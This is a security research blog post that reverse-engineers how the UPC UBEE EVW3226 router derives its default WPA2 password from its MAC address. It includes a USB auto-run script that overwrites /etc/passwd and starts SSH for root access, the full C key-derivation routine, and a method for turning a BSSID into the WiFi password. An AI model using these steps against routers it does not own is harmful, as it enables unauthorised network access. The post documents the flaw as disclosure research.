---
layout: post
title:  "UPC UBEE EBW3226 WPA2 Password RExing"
date:   2016-06-14 19:11:48 +0200
categories: blog
tags: hacking router reversing hacking
excerpt_separator: <!-- more -->

---

TL;DR: We reversed default WPA2 password generation routine for UPC UBEE EBW3226 router.  
This blog contains firmware analysis, reversing writeup, function statistical analysis and proof-of-concept generator.

<!-- more -->

# Introduction

This work was motivated by the work of [Blasty](https://twitter.com/bl4sty).
Several months ago he published the algorithm ( [upc_keys.c](https://haxx.in/upc-wifi/) ) generating candidate default
WPA2 passwords for UPC WiFi routers using just SSID of the router. Vulnerable routers used just router ID to generate
default WiFi password and WiFi SSID. Algorithm goes through all possible router serial IDs and if SSID matches,
it prints out candidate WiFi password (cca 20).

To our surprise it worked pretty well in our city, where 6 out of 10 UPC WiFi around were vulnerable. But it didn’t
work for newer router models and for my own. So we decide to look at this particular model if we were lucky to find
the same vulnerability in it.

Our modem is UBEE EVW3226. As I don’t want to experiment on my own home router I bought one from the guy selling
exactly the same model. There are guys who managed to get root access to the router by connecting to the UART
interface of the router. I recommend going through this article: <https://www.freeture.ch/?p=766>

[![UBEE top](/static/ubee/ubee_front.jpg)](/static/ubee/ubee_front.jpg)

Lucky for us, we didn’t have to mess with the UART interface of the router even though I was looking forward to it.
Just a day before I bought my UBEE router for experiments, Firefart [published an article](https://firefart.at/post/upc_ubee_fail/)
how to get a root on the router just by inserting a USB drive with simple scripts.

Tl;dr: If USB drive has name `EVW3226`, shell script
`.auto` on it gets executed with system privileges. With this script you start SSH server, connect
prepared USB drive to the router and enjoy the root.

# Firmware Extraction

With this I managed to dump the whole firmware on the mounted USB drive.
The script we use to start SSH daemon and to dump the firmware is below.
Note: for detailed instructions on preparing USB drive please refer to the original [article](https://firefart.at/post/upc_ubee_fail/).

```bash
#!/bin/bash
if [ ! -e /etc/passwd.1 ]; then
	cp /etc/passwd /etc/passwd.1

    # dropbear_rsa_host_key has to be prepared on the USB drive 
    echo "admin:FvTuBQSax2MqI:0:0:admin,,,:/:/bin/sh" > /etc/passwd
    dropbear -r /var/tmp/disk/dropbear_rsa_host_key -p 192.168.0.1:22

    # Dump router FS to the drive as tar
    WHERE=/var/tmp/disk/HOMEROUTER
    mkdir -p ${WHERE}
    tar -cvpf ${WHERE}/router-image-root.tar -X/var/tmp/disk/tar-exclude /
    sync

    ## dd all mounted file systems
    for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtdblock$i"; dd if="/dev/mtdblock${i}"\
           of="${WHERE}/fw-${i}.bin" bs=1 conv=noerror; done
    for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtd$i"; dd if="/dev/mtd${i}" \
           of="${WHERE}/fw-${i}b.bin" bs=1 conv=noerror; done
    sync

    # Make simple FS copy
    DDIR=`pwd`
    WHERE=/var/tmp/media/0AAA-0E65/HOMEROUTER
    cd /
	mkdir -p $WHERE
	find /proc -type f | grep -v '/sys/' | grep -v '/net/' | grep -v '/kmsg' | \
       while read F ; do
   		D=${WHERE}/${F%/*}
   		echo "D: $D  F: $F WHERE: ${WHERE}$F"
   		test -d "$D" || mkdir -p $D && echo "DIR: $D"
   		test -f "${WHERE}$F" || cat $F > ${WHERE}$F
	done
	cd "$DDIR"
fi
```

This is actually very powerful and convenient attack vector. One comes with USB drive to the router,
plugs it in and has a WPA2 password in seconds (all system configuration).

I’ve created a TAR of the whole filesystem plus raw binary images of the mounted file system.
With SSH I could start mess around the router firmware.

Firstly, the quick review of mounted file systems:

```
# mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
proc on /proc type proc (rw,relatime)
ramfs on /var type ramfs (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /dev type tmpfs (rw,relatime)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
/dev/mtdblock10 on /nvram type jffs2 (rw,relatime)
tmpfs on /fss type tmpfs (rw,relatime)
/dev/mtdblock6 on /fss/gw type squashfs (ro,relatime)
/dev/mtdblock7 on /fss/fss2 type squashfs (ro,relatime)
/dev/mtdblock9 on /fss/fss3 type squashfs (ro,relatime)
tmpfs on /etc type tmpfs (rw,relatime)
/dev/sda1 on /var/tmp/media/0AAA-0E65 type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=utf8,shortname=mixed,errors=remount-ro)

# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00020000 00010000 "U-Boot"
mtd1: 00010000 00010000 "env1"
mtd2: 00010000 00010000 "env2"
mtd3: 00b80000 00010000 "UBFI1"
mtd4: 001c191c 00010000 "Kernel"
mtd5: 00504c00 00010000 "RootFileSystem"
mtd6: 00377000 00010000 "FS1"
mtd7: 00440000 00010000 "FS2"
mtd8: 00b80000 00010000 "UBFI2"
mtd9: 00400000 00010000 "FS3"
mtd10: 00080000 00010000 "nvram"
```

Calling the cli command revealed firmware version

```
# cli
IMAGE_NAME=vgwsdk-3.5.0.24-150324.img
FSSTAMP=20150324141918
VERSION=EVW3226_1.0.20
```

While USB was dumping the firmware I went for the target - WiFi password. In the process list `ps -a` I’ve found:

```
5681 admin     1924 S    hostapd -B /tmp/secath0
```

`hostapd` is clearly the daemon running WiFi. It has the password to the WiFi stored in its configuration.
And clearly, there must be a binary/script that generates that configuration when user changes the
password OR the router is factory reset.

The file `secath0` stores the current WiFi configuration. I select only relevant lines for simplicity. The configuration file stated:

```
interface=ath0
bridge=rndbr1
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ssid=UPC2659797

wpa=3
wpa_passphrase=IVGDQAMI
wpa_key_mgmt=WPA-PSK
```

Great, we have *SSID* and *PASSPHRASE* stored here. Something must have generated this configuration file.

# Firmware analysis

For more experiments, we use `router-image-root.tar`, extract it on local file system to look around. With this
 we find interesting binaries that have something to do with `secath0` file.
Note this is naive approach, the thing you try first. Binaries might have been obfuscated so the strings
won’t reveal anything. In this case, we were lucky.

```
find . -type f -exec grep -il 'secath0' {} \;
./fss/gw/lib/libUtility.so
./fss/gw/usr/sbin/aimDaemon
./fss/gw/usr/www/cgi-bin/setup.cgi
./var/tmp/conf_filename
./var/tmp/www/cgi-bin/setup.cgi
```

There are obviously 3 nice looking candidates to inspect further. `libUtility.so`, `aimDaemon`, `setup.cgi`.
You can also find those attached to the article. Running strings at those files reveals a lot of interesting stuff.
Even bizarre - more on that later.

`Setup.cgi` - it is the main script that handles changes in the router admin user interface (www, cgi).
Lets look at it with IDA Pro. The function list got my attention:

[![Function table](/static/ubee/functionTable.png)](/static/ubee/functionTable.png)

Symbols were not removed, which makes analysis substantially easier (child play even).
`GWDB_UBEE_DEFAULT_SSID_SET` looks promising. Function graph calling this looks like this:

[![Call graph](/static/ubee/callGraph01.png)](/static/ubee/callGraph01.png)

So `sub_17CF0` could be some kind of factory reset / apply settings routine. Which indeed is, as function
inspection shown. I recommend going through the whole routine to get impression how that works in detail.
Basically, it sets MAC addresses, generate SSIDs, passwords, sets up the firewall and parental control,
some settings are stored to `/nvram/*`.

[![sub_17CF0 intro](/static/ubee/sub17CF0Intro.png)](/static/ubee/sub17CF0Intro.png)

These chunks are particularly interesting to me:

![Default Passphrase set](/static/ubee/defaultPassphraseSet.png)  |  ![Default SSID set](/static/ubee/defaultSSIDSet.png)

BTW just a side note, programmer of this router is probably kind of guy which presses CTRL+C multiple times when
copying something, just to be sure it really did copy to clipboard:

[![Sync Sync Sync](/static/ubee/syncSyncSync.png)](/static/ubee/syncSyncSync.png)

So `GenUPCDefaultPassPhrase` is our target. This one is not directly in the `setup.cgi` file but it is an
imported function. Simple search gives where else this symbol is mentioned:

```
find . -type f -exec grep -il 'GenUPCDefaultPassPhrase' {} \;
./fss/gw/lib/libUtility.so
```

The file `libUtility.so` also has symbols in it. Finding the generation function and reversing it was quite simple.
I had quite funny moments when reversing the function so I recommend to go through it.
I minimize the level of boring details. Attached assembly snippets are just for illustrative purposes, no need to study it in depth...

# GenUPCDefaultPassPhrase 
The `GenUPCDefaultPassPhrase` function intro looks like this:

[![Intro](/static/ubee/genIntro.png)](/static/ubee/genIntro.png)

*Function intro*

The function does some initialization in the beginning, local variable setting and so on.
Few instructions later, it reads a file `/nvram/1/1`.

[![NVRAM read](/static/ubee/nvramRead.png)](/static/ubee/nvramRead.png)

*NVRAM read*

Depending on the mode input parameter (binary flag determining band, 2.4 or 5 GHz), it reads _6_ bytes,
either from offset _0x20_ or _0x32_ from the beginning of the file `/nvram/1/1`. 6 bytes suggests it is _MAC_ address of the device.
You don’t have to be genius to guess that, look at the function `j_increaseMACAddress` - which increments MAC
address by 1. Luckily, this is the only input the function takes to generate WPA2 passwords! It means one can
generate the exact password, without need to guess the candidate ones (as Blasty found for another model).

We later discovered the MAC address used as function input is not exactly the BSSID (= MAC of the WiFi interface).
For 2.4GHz network it is numerically smaller by 3. So if BSSID ends on 0xf9, the MAC used for 
computation is 0xf6 for 2.4GHz network.

Actually when you do `hexdump -C nvram/1/1` 
You can spot something that resembles MAC address on positions _0x20_ and  _0x32_ . Actually the first 3-5
 bytes are same as MACs printed on the label on the router.

[![Increase MAC](/static/ubee/modIncreaseMac.png)](/static/ubee/modIncreaseMac.png)

*MAC input*

The MAC address is then plugged to the weird looking magic string. It does:

```c
sprintf(buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345",
  mac[0], mac[1],
  mac[2], mac[3],
  mac[4], mac[5]);
```

It seems like there is a MAC used to derive multiple different outputs (SSID, PASSPHRASE) in the code, so
the differentiate it for different uses, a different suffix is added to it. In fact, converted to ASCII
it says `UPCDEAULTPASSPHRASE`.

[![sprintf Magic string](/static/ubee/sprintfMagicString.png)](/static/ubee/sprintfMagicString.png)

*Sprintf magic string*

This resulting string got MD5 hashed:

[![hashing 01](/static/ubee/hashing01.png)](/static/ubee/hashing01.png)

*MD5 Hashing*

Just in case the hashed string had too much entropy, guys decided to do another `sprintf`,
but cutting it down using 3 bytes of entropy at maximum (buff2 contains the MD5 hash):

```c
sprintf(buff3, "%.02X%.02X%.02X%.02X%.02X%.02X",
  buff2[0]&0xF, buff2[1]&0xF,
  buff2[2]&0xF, buff2[3]&0xF,
  buff2[4]&0xF, buff2[5]&0xF);
```

[![sprintf01](/static/ubee/sprintf01.png)](/static/ubee/sprintf01.png)

*Sprintf*

When adding more hashing harmed somebody... So hash it again, so it is really secure:

[![hashing 02](/static/ubee/hashingAgain.png)](/static/ubee/hashingAgain.png)

*MD5 hashing*

Later things got interesting as well. The following function is doing modulo `0x1a = 26`. That is the length of English
alphabet. Somebody is trying to beat `[A-Z]{8}` string out of it - which is good for us as UPC password is exactly of
this format.

So far the WPA2 default password derivation function is basically like this:

```c

// 1. MAC + hex(UPCDEAULTPASSPHRASE)
sprintf(buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345",
  mac[0], mac[1],
  mac[2], mac[3],
  mac[4], mac[5]);

// 2. MD5 hash the string
MD5_Init(&ctx);
MD5_Update(&ctx, buff1, strlen((char*)buff1)+1);
MD5_Final(buff2, &ctx);

// 3. Take 3B of the result, build a new string
sprintf(buff3, "%.02X%.02X%.02X%.02X%.02X%.02X",
  buff2[0]&0xF, buff2[1]&0xF,
  buff2[2]&0xF, buff2[3]&0xF,
  buff2[4]&0xF, buff2[5]&0xF);

// 4. MD5 hash the string
MD5_Init(&ctx);
MD5_Update(&ctx, buff3, strlen((char*)buff3)+1);
MD5_Final(hash_buff, &ctx);

// 5. Projection to 26char alphabet
sprintf(passwd, "%c%c%c%c%c%c%c%c",
        0x41u + ((hash_buff[0]+hash_buff[8]) % 0x1Au),
        0x41u + ((hash_buff[1]+hash_buff[9]) % 0x1Au),
        0x41u + ((hash_buff[2]+hash_buff[10]) % 0x1Au),
        0x41u + ((hash_buff[3]+hash_buff[11]) % 0x1Au),
        0x41u + ((hash_buff[4]+hash_buff[12]) % 0x1Au),
        0x41u + ((hash_buff[5]+hash_buff[13]) % 0x1Au),
        0x41u + ((hash_buff[6]+hash_buff[14]) % 0x1Au),
        0x41u + ((hash_buff[7]+hash_buff[15]) % 0x1Au));
```

## Statistical analysis

A way the projection to 26 character alphabet ( last `sprintf` ) is made is interesting, let's stop here a bit.
Programmer does byte addition here, modulo 26. On the first reading this might seem weird, why he just not did

```c
0x41u + (hash_buff[0] % 0x1Au) // PAlt1
```

or

```c
0x41u + ((hash_buff[0]^hash_buff[8]) % 0x1Au) // PAlt2
```

Technical note: input bytes come from MD5 cryptographic hash function so basically we can assume the distribution
on these MD5 output bytes is uniform assuming the MD5 input is non-random/non-repeating.

The choice of addition is very clever because the output distribution on the alphabet is almost uniform.
The naive approaches of mentioned projections `PAlt1`, `PAlt2` seemingly give non-uniform distribution for
\\( \\{22, 23, 24, 25 \\} \\) as \\( 255 \; \% \; 26 = 21 \\) as the following histograms illustrate:

[![A plus B mod 26](/static/ubee/distribApBmod26.png)](/static/ubee/distribApBmod26.png)

[![A xor B mod 26](/static/ubee/distribAxBmod26.png)](/static/ubee/distribAxBmod26.png)

For sake of this statistical analysis we analyzed \\( 2^{24} \\) passwords generated by going through all MAC addresses
with 3B static prefix `0x647c34` = UBEE vendor prefix.
The measured distribution of `[A-Z]` characters on generated passwords is depicted on the following histogram.

[![Alphabet distribution](/static/ubee/alphabetDistribution.png)](/static/ubee/alphabetDistribution.png)

There is a peak around `V` very similar to the distribution generated by \\( (A + B)\; \% \; 26 \\).
In order to check how good the function is (i.e., how random)
 and to verify the hypothesis about the peak we perform a simple statistical test on 
 distribution of the characters over passwords.

The following table shows the alphabet character counts on computed password sample. Each 
character is counted with respect to particular position of occurrence
in password and it _total_ (summed over all positions).

| Char |  1 pos |  2 pos |  3 pos |  4 pos |  5 pos |  6 pos |  7 pos |  8 pos |  Total |
| ---- | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: |
A|644778|644428|646398|644673|645774|645233|644624|645889|5161797
B|645030|644096|644019|644545|647749|645814|645146|644128|5160527
C|645417|646058|645627|644519|645682|645301|645349|645314|5163267
D|643115|645817|644916|644761|647198|646917|644382|645460|5162566
E|645279|645777|645389|642635|643562|645356|645430|645053|5158481
F|645155|644792|644251|646556|645273|643350|644826|644891|5159094
G|645048|643635|644765|645550|646089|645319|644699|645304|5160409
H|647690|645077|646506|645264|643111|646623|644634|646248|5165153
I|645447|643738|644156|646231|643799|643904|646028|645191|5158494
J|646173|647567|644446|646871|643707|643784|644831|645184|5162563
K|646081|644194|645332|645956|643045|645426|645604|644482|5160120
L|646300|647688|643770|647416|647079|643306|646640|644420|5166619
M|645722|644721|645900|646626|642120|647041|644419|645598|5162147
N|643346|642926|647641|645527|645881|646807|644758|645506|5162392
O|644288|647278|643665|643211|**643123**|644586|643429|645178|5154758
P|645725|644212|645598|644131|645169|643481|644561|645659|5158536
Q|646319|645548|645540|644635|646609|645556|646083|644238|5164528
R|646186|646918|646082|645293|644315|644532|643100|645163|5161589
S|645031|644356|644010|646061|644305|645367|646671|645296|5161097
T|644615|645493|646729|643215|646369|646701|646930|645168|5165220
U|645821|643468|646697|648493|645028|644295|646569|**646925**|5167296
V|645032|646976|646428|646303|646255|646786|646234|644715|5168729
W|644853|646818|645351|647347|648049|643937|645605|646118|5168078
X|644808|645319|645935|642205|647130|646064|644734|645271|5161466
Y|643755|646243|644738|644890|644328|646601|644214|645187|5159956
Z|646202|644073|643327|644302|646467|645129|647716|645630|5162846
{:.mbtablestyle2}

We see that the number of occurrences is pretty much balanced around a mean value 645277.
There are also values that are more or less distant from this mean. The question is whether this
balance is just a statistical fluctuation or it is really a significant bias from the distribution we expect.

With hypothesis testing framework we can say whether this bias is statistically significant or not.
The null hypothesis we are going to test against is \\( H_0: \\) the distribution of characters from the alphabet is
uniform over characters. The alternative hypothesis is the distribution is not uniform. If our test rejects
null hypothesis we know there is a bias. If we cannot reject the null hypothesis, we assume it still holds, but it does
not mean the hypothesis is proven.

Without loss of generality, consider the first character position of the password. We want to test whether character `A`
has expected probability of appearance. Expected probability is \\( {1}/{26} \\). We have \\( 2^{24} \\) samples
from the distribution on the first character.

There are several ways for testing uniformity of a random number generator. 
For more complex methods please refer to 
[\[1\]](http://www.cse.wustl.edu/~jain/cse567-08/ftp/k_27trg.pdf) or 
[\[2\]](http://www.fi.muni.cz/~xkrhovj/lectures/2005_PA168_Statistical_Testing_slides.pdf). We are going 
to use a simple method, to demonstrate the approach.

Assuming \\( H_0 \\) holds the distribution follows [Binomial Distribution](https://en.wikipedia.org/wiki/Binomial_distribution)
where number of trials \\(n = 2^{24} \\), probability of success \\( p = 1/26 \\) (success is if characters `A` was generated). 
The expected number of success events is then \\( np = 2^{24} / 26 = 645277.54 \\). Moreover,
from the [Central Limit Theorem](https://en.wikipedia.org/wiki/Central_limit_theorem) this distribution
can be approximated with [Normal distribution](https://en.wikipedia.org/wiki/Normal_distribution) as the number of 
samples is big enough, thus it is a good approximation.

Basic of hypothesis testing is very well explained in this [article](http://20bits.com/article/hypothesis-testing-the-basics).
We define \\( \alpha = 0.01 \\) so the level of confidence the null hypothesis is false is 99%.

Under assumption of null hypothesis the distribution of `A` characters on the first character should follow Normal Distribution
with given mean. With 99% confidence level we can reject the null hypothesis if observed probability lies outside 99%
of the area of the normal curve, it approximately corresponds to distance 2.58 standard deviations from mean:

[![Normal curve](/static/ubee/normal-curve-small.png)](/static/ubee/normal-curve-small.png)

*Normal curve*

Note: The distance from the mean in terms of standard deviations is called Z-score.

We performed the hypothesis testing for each character on each position and on overall statistics.
Hypothesis about uniformity on given character on given password position 
is rejected with 99% confidence level if the corresponding field contains `x` character in the following table:.

| Char |  1 pos |  2 pos |  3 pos |  4 pos |  5 pos |  6 pos |  7 pos |  8 pos |  total |
| ---- | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: |
A|-|-|-|-|-|-|-|-|-
B|-|-|-|-|x|-|-|-|-
C|-|-|-|-|-|-|-|-|-
D|x|-|-|-|-|-|-|-|-
E|-|-|-|x|-|-|-|-|-
F|-|-|-|-|-|-|-|-|-
G|-|-|-|-|-|-|-|-|-
H|x|-|-|-|x|-|-|-|-
I|-|-|-|-|-|-|-|-|-
J|-|x|-|-|-|-|-|-|-
K|-|-|-|-|x|-|-|-|-
L|-|x|-|x|-|-|-|-|-
M|-|-|-|-|x|-|-|-|-
N|-|x|x|-|-|-|-|-|-
O|-|-|-|x|x|-|-|-|x
P|-|-|-|-|-|-|-|-|-
Q|-|-|-|-|-|-|-|-|-
R|-|-|-|-|-|-|x|-|-
S|-|-|-|-|-|-|-|-|-
T|-|-|-|x|-|-|-|-|-
U|-|-|-|x|-|-|-|-|-
V|-|-|-|-|-|-|-|-|x
W|-|-|-|x|x|-|-|-|x
X|-|-|-|x|-|-|-|-|-
Y|-|-|-|-|-|-|-|-|-
Z|-|-|-|-|-|-|x|-|-
{:.mbtablestyle2}

From the table above we see there are biases on both particular positions and in total. For example,
character `W` is biased on positions password positions 4 and 5 and in overall statistics (pos 1-8). On contrary
we cannot reject null hypothesis for character `A`.

It would not be fair to test uniformity hypothesis as the output transformation on the password (last `sprintf`, step 5)
has a slight bias. Example:

| Char | Uniform distribution | Real distribution |
| ---- | --------------------:| -----------------:|
|  O   | \\( \frac{1}{26} = 0.03846 \\) | \\( \frac{2520}{65536} = 0.03845 \\) |
|  V   | \\( \frac{1}{26} = 0.03846 \\) | \\( \frac{2524}{65536} = 0.03851 \\) |
{:.mbtablestyle2}

When we change null hypothesis so the expected character distribution is not uniform but
distribution generated by function \\( (A + B)\; \% \; 26 \\) we get:

| Char |  1 pos |  2 pos |  3 pos |  4 pos |  5 pos |  6 pos |  7 pos |  8 pos |  total |
| ---- | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: |
A|-|-|-|-|-|-|-|-|-
B|-|-|-|-|x|-|-|-|-
C|-|-|-|-|-|-|-|-|-
D|-|-|-|-|x|-|-|-|-
E|-|-|-|x|-|-|-|-|-
F|-|-|-|-|-|-|-|-|-
G|-|-|-|-|-|-|-|-|-
H|x|-|-|-|-|-|-|-|-
I|-|-|-|-|-|-|-|-|-
J|-|x|-|-|-|-|-|-|-
K|-|-|-|-|x|-|-|-|-
L|-|x|-|x|-|-|-|-|-
M|-|-|-|-|x|-|-|-|-
N|-|x|x|-|-|-|-|-|-
O|-|x|-|-|-|-|-|-|x
P|-|-|-|-|-|-|-|-|-
Q|-|-|-|-|-|-|-|-|-
R|-|-|-|-|-|-|-|-|-
S|-|-|-|-|-|-|-|-|-
T|-|-|-|x|-|-|-|-|-
U|-|x|-|x|-|-|-|-|-
V|-|-|-|-|-|-|-|-|-
W|-|-|-|-|x|-|-|-|-
X|-|-|-|x|-|-|-|-|-
Y|-|-|-|-|-|-|-|-|-
Z|-|-|-|-|-|-|x|-|-
{:.mbtablestyle2}

When taking generator biases into account we now see that null hypothesis cannot be rejected for `V`, `W` while 
in the previous test we rejected it. 
The only one character the null hypothesis we can reject for in overall statistics is `O`.

Interestingly, if we would use second `sprintf` function in step 3 in a slightly more reasonable way:

```c
// old function - broken, low entropy...
sprintf((char*)buff3, "%.02X%.02X%.02X%.02X%.02X%.02X",
    buff2[0]&0xF, buff2[1]&0xF,
    buff2[2]&0xF, buff2[3]&0xF,
    buff2[4]&0xF, buff2[5]&0xF);

// Instead of that do this
sprintf((char*)buff3, "%.02X%.02X%.02X%.02X%.02X%.02X",
    buff2[0], buff2[1],
    buff2[2], buff2[3],
    buff2[4], buff2[5]);
```

We would obtain the following table for hypothesis rejection:

| Char |  1 pos |  2 pos |  3 pos |  4 pos |  5 pos |  6 pos |  7 pos |  8 pos |  total |
| ---- | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: |
A|-|-|-|-|-|-|-|-|-
B|-|-|-|-|-|-|-|-|-
C|-|-|-|-|-|-|-|-|-
D|x|-|-|-|-|-|-|-|-
E|-|-|-|-|-|-|-|-|-
F|-|-|-|-|-|-|-|-|-
G|-|-|-|-|-|-|-|-|-
H|-|-|-|-|-|-|-|-|-
I|-|-|-|-|-|-|-|-|-
J|-|-|-|x|-|-|-|-|-
K|-|-|-|-|-|-|-|-|-
L|-|-|-|-|-|-|-|-|-
M|-|-|-|-|-|-|-|-|-
N|-|-|-|-|-|-|-|-|-
O|-|-|-|-|-|-|-|-|-
P|-|-|-|-|-|-|-|-|-
Q|-|-|-|-|-|-|-|-|-
R|-|-|-|-|-|-|-|-|-
S|-|-|-|-|-|-|-|-|-
T|-|-|-|-|-|-|-|-|-
U|-|-|-|-|-|-|-|-|-
V|-|-|-|-|-|-|-|-|-
W|-|-|-|-|-|-|-|-|-
X|-|x|-|-|-|-|-|-|-
Y|-|-|-|-|-|-|-|-|-
Z|-|-|-|-|-|-|-|-|-
{:.mbtablestyle2}

We see this function has better statistical properties. But note it is still
not optimal as we are throwing out majority of MD5 result. We can do it even better. 

The last we analyze function that completely skips step 3 & 4, so it performs only one
MD5 hashing.

| Char |  1 pos |  2 pos |  3 pos |  4 pos |  5 pos |  6 pos |  7 pos |  8 pos |  total |
| ---- | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: | -----: |
A|-|-|-|-|-|-|-|-|-
B|-|-|-|-|-|-|-|-|-
C|-|-|-|-|-|-|-|-|-
D|-|-|-|-|-|-|-|-|-
E|-|-|-|-|-|-|-|-|-
F|-|-|-|-|-|-|-|-|-
G|-|-|-|-|-|-|-|-|-
H|-|-|-|x|-|-|-|-|-
I|-|-|-|-|-|-|-|-|-
J|-|-|-|-|-|-|-|-|-
K|-|-|-|-|-|-|-|-|-
L|-|-|-|-|-|-|-|-|-
M|-|-|-|-|-|-|-|-|-
N|-|-|-|-|-|-|-|-|-
O|-|-|-|-|-|-|-|-|-
P|-|-|-|-|-|-|-|-|-
Q|-|-|-|-|-|-|-|-|-
R|-|-|-|-|-|-|-|-|-
S|-|-|-|-|-|-|-|-|-
T|-|-|-|-|-|-|-|-|-
U|-|-|-|-|-|-|-|-|-
V|-|-|-|-|-|-|-|-|-
W|-|-|-|-|-|-|-|-|-
X|-|-|-|-|-|-|-|-|-
Y|-|-|-|-|-|-|-|-|-
Z|-|-|-|-|-|-|-|-|-
{:.mbtablestyle2}

From results we conclude that from mathematical/statistical point of view the simpler function has 
significantly better statistical properties compared to function with some "obfuscation" steps.
MD5 itself is quite good crypto hash function thus I cannot see any benefit 
from step 3, 4 in the original password function. Authors maybe tried to 
make it hard to guess derivation function or relation of MAC address to default password
 so they added this additional step.
If this is the case, it is implemented in the wrong way and pretty much without 
desired effect. Unless authors had some other design goals that we are not aware of.

## Reversing part 2

So I went through the analysis and the next thing completely blew my mind:

[![Profanity check](/static/ubee/profanities02.png)](/static/ubee/profanities02.png)

You cannot miss the “cocks” right in front of you. So there is a `profanities_ptr` which points to the database of
rude words…

# Profanity analysis

From curiosity I went through the database. Here is the small sample:

[![Profanity hex sample](/static/ubee/profanityHexSample.png)](/static/ubee/profanityHexSample.png)

So the UPC default password generation does apply some obscure hashing function, generates
`[A-Z]{8}` string from it and then checks if by any chance some of the rude words is not a substring of the
generated password. Of course, this is a production problem, who wants to deal with an angry customer
calling your help desk complaining the default password on his router is *MILFPIMP* or *ANALBLOW*, right?

In case the generated password contains this profanity in it, UBEE engineers added a special, non-insulting alphabet
for help. The alphabet is visible on the beginning of the analyzed function: `BBCDFFGHJJKLMNPQRSTVVWXYZZ`, the classic
one with almost all vowels removed. I did a quick search and truly, there cannot be made a rude word from UBEE
profanity database with this alphabet.

The weird thing about profanity database is there are some of the entries present multiple times, with varying case.
I was wondering why somebody didn’t convert it all to uppercase and removed duplicates at the first place.
Instead of that, UBEE router converts it to uppercase and goes through them incrementally when generating a
random password. Useless CPU cycles... (how many CO emissions could have saved generating it wisely?).
Another thing, the database contains a word “PROSTITUTE” which is made of 10 characters, but there is no
chance the password would match this.

Another optimization would be to remove profanities that are substrings of other profanities.
E.g., "COCK", "COCKS", "COCKY", "ACOCK"

Basically this is the whole WPA2 password generation routine. 
You can find all codes we used, profanity database and more in the repository for the article. <!-- //TODO: repo -->

So to have a bit more fun, we generated a SQLite database for all MAC addresses starting on `0x647c34` =
UBEE vendor prefix, what is \\( 2^{24} \\) = 16777216 passwords. This is quite a number so the profanity detection
was optimized by building [Aho-Corasick](https://en.wikipedia.org/wiki/Aho%E2%80%93Corasick_algorithm)
search automaton, initialized with all profanities from the UBEE database
(very rude automaton indeed). If the profanity was detected as a substring, we also generated a new password from non-insulting alphabet.

From 16777216 passwords in total, 32105 contained at least one profanity in it, in particular in happened 0.19% cases.
Thus in 1000 generated password there are almost 2 containing a profanity. It is more than I intuitively expected. 

Table of profanity occurrences with respect to length: 

| # of characters |  Profanity occurrences |
| :-------------: | :--------------------: |
| 3               |  23090                 |
| 4               |  6014                  |
| 5               |  3001                  |
{:.mbtablestyle2}

There were just 4 distinct 3 character profanities. The histogram:

<!--
```sql
select profanity, count(profanity) as cx from wifi where profanity is not null and length(profanity)=3 group by profanity order by cx desc;
```
-->

[![Profanity size 3](/static/ubee/profanities_c3.png)](/static/ubee/profanities_c3.png)

4 character profanity distribution (33 distinct):

| Word | Occurences | Word | Occurences | Word | Occurences |
| ---- |:----------:| ---- |:----------:| ---- |:----------:|
BUTT   |233         | HOLE |191         | MILF |172
BLOW   |209         | HATE |190         | CUNT |166
AIDS   |205         | DUMB |189         | SMUT |166
DIRT   |205         | SHIT |189         | PORN |165
SEAM   |203         | FUCK |183         | SUCK |165
SLUT   |201         | LICK |181         | DOPE |162
JAIL   |196         | DICK |178         | ANAL |161
COON   |195         | ABBO |177         | PISS |160
GIMP   |194         | BALL |177         | HEAD |155
BOYS   |192         | CRAP |177         | COCK |154
TITS   |192         | TURD |177         | PIMP |154
{:.mbtablestyle2}

[![Profanity size 4](/static/ubee/profanities_c4.png)](/static/ubee/profanities_c4.png)

5 character profanity distribution (including only most popular ones, total 517 distinct):

| Word | Occurences | Word | Occurences |
| ---- |:----------:| ---- |:----------:|
HAETS|19 | FECES|16
TUBAS|19 | NATAL|16
BABES|17 | SKIRT|16
MICHE|17 | WINEY|16
WOADS|17 | ERECT|15
{:.mbtablestyle2}

[![Profanity size 5](/static/ubee/profanities_c5.png)](/static/ubee/profanities_c5.png)

# Conclusion
We managed to reverse engineer both the default WiFi WPA2 password generator function and default SSID generator
functions from router UBEE EBW3226. 

The only input of the functions is MAC address of the device. This MAC address does not exactly
match BSSID, but is slightly shifted. The shift is constant for all routers with this firmware.
Moreover the shift depends on `mode` which is a binary flag saying the computation is made for 2.45GHz or 5GHz WiFi mode.  

The point is the exact value of the shift does not matter that much as the computation for one single MAC
address is very cheap and both SSID and WPA2 password generator uses the same mechanism to generate input MAC.

Thus if we take WiFi BSSID and compute mapping \\( M = \\{ \\) SSID \\( \rightarrow \\) WPA2 \\( \\} \\) 
for \\( \pm \\) 10 MAC around BSSID we can then surely find observed SSID in \\( M \\) and corresponding default
 WPA2 password.
 
From our observation, BSSID for 5GHz = BSSID for 2.4GHz network (MAC is the same).
Furthermore, BSSID = MTA MAC + 3 on the router label.
Table below shows how BSSID and input MAC address relates on the example:

| Band | BSSID | Function input MAC | Offset | SSID | Password |
| ---- | ----- | ------------------ | ------ | ---- | -------- |
2.4 GHz | 64:7c:34:12:34:56 | 64:7c:34:12:34:53 | -3 | UPC2659797 | IVGDQAMI
5.0 GHz | 64:7c:34:12:34:56 | 64:7c:34:12:34:55 | -1 | UPC2870546 | PXKRLPCC
{:.mbtablestyle2} 
 
 
 This is how router label looks like for our example:
 [![UBEE label](/static/ubee/ubee_label.jpg)](/static/ubee/ubee_label.jpg)
 
Our [proof-of-concept](https://github.com/yolosec/TODO) generates the following output
after entering last 3 bytes of BSSID.

```
./ubee_keys 123456

================================================================================
